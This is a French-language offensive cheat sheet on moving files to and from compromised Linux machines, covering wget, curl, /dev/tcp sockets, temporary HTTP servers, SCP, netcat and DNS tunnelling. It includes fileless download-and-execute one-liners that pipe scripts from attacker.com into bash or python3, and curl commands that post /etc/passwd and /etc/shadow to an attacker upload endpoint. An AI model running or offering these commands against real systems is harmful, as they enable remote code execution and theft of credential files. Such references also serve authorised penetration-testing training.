# Transferts de Fichiers dans les Environnements Linux

## Outils Natifs - Téléchargement

La plupart des distributions Linux intègrent plusieurs outils de téléchargement par défaut.

### wget

```bash
# Téléchargement simple
wget http://attacker.com/file.bin

# Téléchargement silencieux avec chemin de sortie personnalisé
wget -q http://attacker.com/file.bin -O /tmp/output.bin

# Téléchargement avec authentification
wget --http-user=user --http-password=pass http://attacker.com/file.bin
```

### curl

```bash
# Téléchargement simple
curl http://attacker.com/file.bin -o output.bin

# Téléchargement silencieux
curl -s http://attacker.com/file.bin -o output.bin

# Téléchargement avec authentification
curl -u user:pass http://attacker.com/file.bin -o output.bin
```

### Execution sans fichier

```bash
# wget - téléchargement et exécution
wget -qO- http://attacker.com/script.sh | bash

# curl - téléchargement et exécution
curl -s http://attacker.com/script.py | python3
```

## Sockets Réseau pour Transferts

Linux permet d'utiliser des sockets pour les transferts sans outils supplémentaires.

### /dev/tcp

```bash
# Téléchargement via sockets TCP
cat < /dev/tcp/attacker.com/80 > file.bin

# Envoyer une requête GET et enregistrer la réponse
exec 3<>/dev/tcp/attacker.com/80
echo -e "GET /file.bin HTTP/1.1\r\nHost: attacker.com\r\n\r\n" >&3
cat <&3 > response.txt
```

## Envoi de Fichiers

### Avec curl

```bash
# Envoi de fichier via POST
curl -X POST -F "file=@/etc/passwd" http://attacker.com/upload

# Envoi de plusieurs fichiers
curl -X POST -F "file1=@/etc/passwd" -F "file2=@/etc/shadow" http://attacker.com/upload
```

## Serveurs HTTP Temporaires

Linux permet de créer rapidement des serveurs HTTP pour le partage de fichiers.

### Python

```bash
# Python 3
python3 -m http.server 8000

# Python 2
python2 -m SimpleHTTPServer 8000
```

### PHP

```bash
php -S 0.0.0.0:8000
```

### Ruby

```bash
ruby -run -ehttpd . -p8000
```

## SCP / SFTP

Transferts sécurisés avec chiffrement SSH.

```bash
# Téléchargement avec SCP
scp user@attacker.com:/path/to/file.bin /local/path/

# Envoi avec SCP
scp /local/file.bin user@target.com:/remote/path/

# SFTP interactif
sftp user@target.com
> get remotefile.bin
> put localfile.bin
```

## Netcat pour Transferts

```bash
# Réception sur la machine cible
nc -l -p 8000 > file.bin

# Envoi depuis la machine source
nc target.com 8000 < file.bin
```

## Techniques Avancées

### Transfert via DNS

Utile dans des environnements très restreints.

```bash
# Sur la machine attaquante
xxd -p -c 16 file.bin | while read line; do dig $line.example.com; done

# Sur le serveur DNS (attaquant)
# Configuration pour capturer les requêtes et reconstruire le fichier
```

## Points Importants

- Toujours vérifier les permissions d'exécution après le transfert (`chmod +x`)
- Préférer les méthodes chiffrées (SCP/SFTP) pour les données sensibles
- Les serveurs HTTP temporaires sont rapides mais non sécurisés
- Netcat est disponible sur de nombreux systèmes par défaut
- Sur les systèmes anciens, Python 2 est souvent disponible quand Python 3 ne l'est pas